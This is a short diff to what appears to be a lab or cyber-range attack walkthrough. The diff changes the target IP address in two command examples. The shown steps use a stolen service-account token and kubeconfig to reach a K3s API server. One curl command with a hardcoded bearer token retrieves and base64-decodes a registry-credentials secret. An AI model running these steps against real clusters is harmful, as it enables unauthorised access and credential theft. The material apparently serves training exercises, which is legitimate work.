@@ -14,7 +14,7 @@ Use the stolen service account token to authenticate to the K3s API server, enum
 export KUBECONFIG=./cloud-ci-kubeconfig.yaml
 # Verify connection
 kubectl cluster-info
-# Kubernetes control plane is running at https://11.0.2.30:6443
+# Kubernetes control plane is running at https://193.0.0.50:6443
 ```
 
 ## Step 2 — Enumerate Namespace Resources
@@ -67,7 +67,7 @@ for k, v in d.items():
 ```bash
 TOKEN="pul-cloud-ci-runner-token-2024gridfall"
 curl -sk -H "Authorization: Bearer ${TOKEN}" \
-    https://11.0.2.30:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
+    https://193.0.0.50:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
     | python3 -c "
 import sys, json, base64
 d = json.load(sys.stdin)['data']
